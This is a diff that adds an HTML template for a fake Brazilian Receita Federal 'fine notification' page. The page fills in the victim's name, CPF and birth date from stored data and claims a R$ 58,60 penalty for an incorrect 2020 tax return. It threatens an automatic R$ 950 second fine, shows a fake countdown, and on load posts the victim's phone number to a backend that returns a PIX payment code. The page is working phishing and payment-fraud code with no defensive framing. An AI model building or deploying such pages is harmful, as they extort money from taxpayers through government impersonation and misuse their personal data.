@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Receita Federal - Multa por Declaração Incorreta</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: italic;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+            font-weight: 500;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-800.5c5f78761d00551b.woff2') }}") format('woff2');
+            font-weight: 800;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+
+        body {
+            background-color: #f8f9fa;
+            font-family: 'Rawline', sans-serif;
+            line-height: 1.6;
+        }
+
+        .main-content {
+            max-width: 900px;
+            margin: 0 auto;
+            background-color: white;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .header {
+            background-color: #0c326f;
+            color: white;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            height: 40px;
+            filter: brightness(0) invert(1);
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+
+        .header-icon {
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .hero-image {
+            text-align: center;
+            background: linear-gradient(135deg, #0c326f 0%, #1e4a8c 100%);
+            padding: 20px;
+        }
+
+        .hero-image img {
+            width: 100%;
+            max-width: 600px;
+            height: auto;
+            border-radius: 4px;
+        }
+
+        .user-info {
+            padding: 30px;
+        }
+
+        .user-info-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 20px;
+        }
+
+        .user-info-text {
+            flex: 1;
+        }
+
+        .user-info-text h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #0c326f;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+
+        .user-info-text p {
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .user-info-image {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            margin-left: 20px;
+        }
+
+        .message-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 4px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .message-box p {
+            margin: 0;
+            color: #856404;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .red-strong {
+            color: #721c24;
+            font-weight: 700;
+        }
+
+        .countdown-timer {
+            background-color: #721c24;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 4px;
+            text-align: center;
+            font-weight: 700;
+            margin-top: 15px;
+            animation: pulse 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes pulse {
+            from {
+                background-color: #721c24;
+            }
+            to {
+                background-color: #dc3545;
+            }
+        }
+
+        .tax-details {
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        .tax-details h4 {
+            color: #0c326f;
+            margin-bottom: 15px;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .document-data {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 8px 15px;
+            margin-bottom: 15px;
+        }
+
+        .document-data dt {
+            font-weight: 600;
+            color: #495057;
+        }
+
+        .document-data dd {
+            color: #212529;
+        }
+
+        .total-value {
+            font-size: 18px;
+            color: #721c24;
+            margin: 15px 0;
+            padding: 15px;
+            background-color: #fff5f5;
+            border-left: 4px solid #721c24;
+            border-radius: 4px;
+        }
+
+        .regularize-button {
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            margin-top: 15px;
+        }
+
+        .regularize-button:hover {
+            background-color: #1e4a8c;
+        }
+
+        .footer {
+            background-color: #0c326f;
+            color: white;
+            text-align: center;
+            padding: 30px;
+            margin-top: 40px;
+        }
+
+        .footer-logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+
+        .footer p {
+            margin: 0;
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        .warning-box {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-left: 4px solid #dc3545;
+            border-radius: 4px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .warning-box h4 {
+            color: #721c24;
+            margin-bottom: 10px;
+            font-size: 16px;
+            font-weight: 700;
+        }
+
+        .warning-box p {
+            color: #721c24;
+            margin: 8px 0;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .multa-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: #dc3545;
+            text-align: center;
+            background-color: #fff;
+            border: 2px solid #dc3545;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 40px;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(12, 50, 111, 0.1);
+            border-radius: 50%;
+            border-top-color: #0c326f;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #0c326f;
+            font-weight: 600;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-content {
+                margin: 0;
+                box-shadow: none;
+            }
+
+            .header {
+                padding: 15px 20px;
+            }
+
+            .user-info {
+                padding: 20px;
+            }
+
+            .user-info-content {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .user-info-image {
+                margin: 15px 0 0 0;
+            }
+
+            .document-data {
+                grid-template-columns: 1fr;
+                gap: 5px;
+            }
+
+            .document-data dt {
+                margin-top: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Logo_Receita_Federal_do_Brasil.svg/1194px-Logo_Receita_Federal_do_Brasil.svg.png" alt="Receita Federal" class="loading-logo">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Carregando dados...</div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content" id="mainContent">
+        <div class="header">
+            <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
+            <div class="header-icons">
+                <i class="fas fa-search header-icon"></i>
+                <i class="fas fa-question-circle header-icon"></i>
+                <i class="fas fa-adjust header-icon"></i>
+            </div>
+        </div>
+
+        <div class="user-info">
+            <div class="user-info-content">
+                <div class="user-info-text">
+                    <h3>NOTIFICAÇÃO DE MULTA - RECEITA FEDERAL DO BRASIL</h3>
+                    <p style="text-align: justify; line-height: 1.4;">
+                        <strong id="customerName">Carregando...</strong>, portador(a) do CPF <strong id="customerCpf">Carregando...</strong>, 
+                        em conformidade com o artigo 44 da Lei nº 9.430/96, informamos que foi emitida uma multa 
+                        por declaração de Imposto de Renda com informações incorretas ou omissas no exercício de 2020.
+                    </p>
+                </div>
+                <img src="https://i.ibb.co/xKfzBFbn/download-1.png" alt="User profile icon" class="user-info-image">
+            </div>
+
+            <div class="warning-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> MULTA EMITIDA</h4>
+                <p>Foi identificada declaração com informações mal informadas ou com erros graves em sua Declaração de Imposto de Renda Pessoa Física do ano de 2020.</p>
+                <div class="multa-value">
+                    MULTA: R$ 58,60
+                    <div style="font-size: 12px; color: #000; margin-top: 8px; font-weight: 400;">
+                        Protocolo: RFB-2025-0758394-ML
+                    </div>
+                </div>
+                <p><strong>Este pagamento é OBRIGATÓRIO</strong> e deve ser quitado imediatamente para evitar maiores complicações.</p>
+            </div>
+
+            <div class="message-box">
+                <p><span class="red-strong">ATENÇÃO <span id="customerFirstName">Contribuinte</span>:</span> O não pagamento desta multa resultará na emissão automática de uma <strong>SEGUNDA MULTA NO VALOR DE R$ 950,00</strong> em seu CPF. Esta segunda multa será aplicada sem aviso prévio conforme estabelecido na legislação tributária vigente.</p>
+                <div class="countdown-timer" id="countdown">Tempo para pagamento: 23h 40m 52s</div>
+            </div>
+
+            <div class="tax-details">
+                <h4>Dados do Contribuinte Multado:</h4>
+                <dl class="document-data">
+                    <dt>Nome:</dt>
+                    <dd id="customerNameDetails">Carregando...</dd>
+                    <dt>CPF:</dt>
+                    <dd id="customerCpfDetails">Carregando...</dd>
+                    <dt>Data de Nascimento:</dt>
+                    <dd id="customerBirthDate">Carregando...</dd>
+                    <dt>Multa Emitida:</dt>
+                    <dd style="color: #dc3545; font-weight: 600;">R$ 58,60</dd>
+                    <dt>Multa Adicional (se não pago):</dt>
+                    <dd style="color: #dc3545; font-weight: 700; font-size: 16px;">R$ 950,00</dd>
+                </dl>
+                <p class="total-value"><strong>Valor a pagar AGORA: R$ 58,60</strong></p>
+                <p>Para evitar a aplicação da multa adicional de <strong>R$ 950,00</strong>, é obrigatório efetuar o pagamento da multa no valor de <strong>R$ 58,60</strong> dentro do prazo estabelecido.</p>
+                
+                <!-- PIX Payment Section -->
+                <div id="pixLoadingSection" style="text-align: center; padding: 20px;">
+                    <div class="loader"></div>
+                    <p class="loader-text">Gerando código PIX para pagamento da multa...</p>
+                </div>
+                
+                <div id="pixPaymentSection" style="display: none;">
+                    <div style="text-align: center; margin: 20px 0; display: flex; justify-content: center; align-items: center;">
+                        <img id="qrCodeImage" src="" alt="QR Code PIX" style="max-width: 200px; border: 1px solid #ddd; border-radius: 8px; display: block; margin: 0 auto;">
+                    </div>
+                    
+                    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin: 15px 0; border: 1px solid #dee2e6;">
+                        <p style="margin: 0 0 10px 0; font-weight: 600; color: #0c326f;">Código PIX (Copia e Cola):</p>
+                        <div style="background-color: white; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace; font-size: 12px; word-break: break-all; max-height: 100px; overflow-y: auto;" id="pixCodeText">
+                            Carregando código PIX...
+                        </div>
+                        <button onclick="copyPixCode()" style="background-color: #0c326f; color: white; border: none; padding: 10px 20px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px; width: 100%;" id="copyButton">
+                            <i class="fas fa-copy"></i> Copiar Código PIX
+                        </button>
+                    </div>
+                    
+                    <div style="background-color: #d4edda; border: 1px solid #c3e6cb; border-radius: 4px; padding: 15px; margin: 15px 0;">
+                        <p style="margin: 0; color: #155724; font-size: 14px; line-height: 1.4;">
+                            <i class="fas fa-info-circle"></i> <strong>Como pagar:</strong><br>
+                            1. Copie o código PIX acima<br>
+                            2. Abra o app do seu banco<br>
+                            3. Vá em PIX → Pagar → Colar código<br>
+                            4. Confirme o pagamento de R$ 58,60
+                        </p>
+                    </div>
+                </div>
+                
+                <div id="pixErrorSection" style="display: none; text-align: center; padding: 20px; background-color: #f8d7da; border: 1px solid #f5c6cb; border-radius: 4px; margin: 15px 0;">
+                    <p style="color: #721c24; margin: 0;">Erro ao gerar código PIX. Tente novamente em alguns instantes.</p>
+                    <button onclick="generatePixForMulta()" style="background-color: #dc3545; color: white; border: none; padding: 10px 20px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px;">
+                        Tentar Novamente
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <footer class="footer">
+            <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
+            <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+        </footer>
+    </div>
+
+    <script>
+        // Load customer data from localStorage
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hide loading screen after 2 seconds
+            setTimeout(function() {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+            }, 2000);
+
+            // Load customer data from localStorage
+            const customerDataStr = localStorage.getItem('customerData');
+            if (customerDataStr) {
+                try {
+                    const customerData = JSON.parse(customerDataStr);
+                    
+                    // Update all customer data fields
+                    document.getElementById('customerName').textContent = customerData.nome || 'Nome não encontrado';
+                    document.getElementById('customerCpf').textContent = customerData.cpf || 'CPF não encontrado';
+                    document.getElementById('customerNameDetails').textContent = customerData.nome ? customerData.nome.toUpperCase() : 'NOME NÃO ENCONTRADO';
+                    document.getElementById('customerCpfDetails').textContent = customerData.cpf || 'CPF não encontrado';
+                    
+                    // Format birth date
+                    if (customerData.data_nascimento) {
+                        const dateParts = customerData.data_nascimento.includes(' ') ? 
+                            customerData.data_nascimento.split(' ')[0].split('-') : 
+                            customerData.data_nascimento.split('-');
+                        
+                        if (dateParts.length === 3) {
+                            document.getElementById('customerBirthDate').textContent = `${dateParts[2]}/${dateParts[1]}/${dateParts[0]}`;
+                        } else {
+                            document.getElementById('customerBirthDate').textContent = customerData.data_nascimento;
+                        }
+                    } else {
+                        document.getElementById('customerBirthDate').textContent = 'Data não disponível';
+                    }
+                    
+                    // Get first name for personalization
+                    const firstName = customerData.nome ? customerData.nome.split(' ')[0] : 'Contribuinte';
+                    document.getElementById('customerFirstName').textContent = firstName;
+                    
+                    console.log('Customer data loaded from localStorage');
+                } catch (e) {
+                    console.error('Error parsing customer data from localStorage:', e);
+                    // Redirect to home if no valid data
+                    setTimeout(() => {
+                        window.location.href = '/';
+                    }, 3000);
+                }
+            } else {
+                console.log('No customer data found in localStorage, redirecting to home');
+                // Redirect to home if no data found
+                setTimeout(() => {
+                    window.location.href = '/';
+                }, 3000);
+            }
+
+            // Countdown timer
+            startCountdown();
+            
+            // Generate PIX automatically when page loads
+            generatePixForMulta();
+        });
+
+        let currentPixCode = '';
+
+        function generatePixForMulta() {
+            document.getElementById('pixLoadingSection').style.display = 'block';
+            document.getElementById('pixPaymentSection').style.display = 'none';
+            document.getElementById('pixErrorSection').style.display = 'none';
+
+            // Get phone number from localStorage
+            const customerDataStr = localStorage.getItem('customerData');
+            let telefone = '';
+            
+            if (customerDataStr) {
+                try {
+                    const customerData = JSON.parse(customerDataStr);
+                    telefone = customerData.telefone || '';
+                    console.log('📞 Telefone recuperado do localStorage para multa:', telefone);
+                } catch (e) {
+                    console.error('Error parsing customer data:', e);
+                }
+            }
+
+            fetch('/generate-pix-multa', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    telefone: telefone
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('pixLoadingSection').style.display = 'none';
+                
+                if (data.success && data.pix_code && data.qr_code_image) {
+                    // Show PIX payment section
+                    currentPixCode = data.pix_code;
+                    document.getElementById('qrCodeImage').src = data.qr_code_image;
+                    document.getElementById('pixCodeText').textContent = data.pix_code;
+                    document.getElementById('pixPaymentSection').style.display = 'block';
+                    console.log('PIX gerado com sucesso para multa');
+                } else {
+                    // Show error section
+                    document.getElementById('pixErrorSection').style.display = 'block';
+                    console.error('Erro ao gerar PIX para multa:', data);
+                }
+            })
+            .catch(error => {
+                document.getElementById('pixLoadingSection').style.display = 'none';
+                document.getElementById('pixErrorSection').style.display = 'block';
+                console.error('Erro na requisição PIX para multa:', error);
+            });
+        }
+
+        function copyPixCode() {
+            if (currentPixCode) {
+                navigator.clipboard.writeText(currentPixCode).then(function() {
+                    const button = document.getElementById('copyButton');
+                    const originalText = button.innerHTML;
+                    button.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+                    button.style.backgroundColor = '#28a745';
+                    
+                    setTimeout(function() {
+                        button.innerHTML = originalText;
+                        button.style.backgroundColor = '#0c326f';
+                    }, 2000);
+                }).catch(function(err) {
+                    console.error('Erro ao copiar código PIX: ', err);
+                    alert('Erro ao copiar código. Tente selecionar e copiar manualmente.');
+                });
+            }
+        }
+
+        function startCountdown() {
+            const countdownElement = document.getElementById('countdown');
+            let hours = 23;
+            let minutes = 40;
+            let seconds = 52;
+
+            function updateCountdown() {
+                if (seconds > 0) {
+                    seconds--;
+                } else if (minutes > 0) {
+                    minutes--;
+                    seconds = 59;
+                } else if (hours > 0) {
+                    hours--;
+                    minutes = 59;
+                    seconds = 59;
+                } else {
+                    countdownElement.textContent = "PRAZO EXPIRADO!";
+                    countdownElement.style.backgroundColor = "#dc3545";
+                    return;
+                }
+
+                const hoursStr = hours.toString().padStart(2, '0');
+                const minutesStr = minutes.toString().padStart(2, '0');
+                const secondsStr = seconds.toString().padStart(2, '0');
+                
+                countdownElement.textContent = `Tempo para pagamento: ${hoursStr}h ${minutesStr}m ${secondsStr}s`;
+            }
+
+            setInterval(updateCountdown, 1000);
+        }
+
+        // Removed pagarMulta function as PIX is now generated automatically
+    </script>
+</body>
+</html>
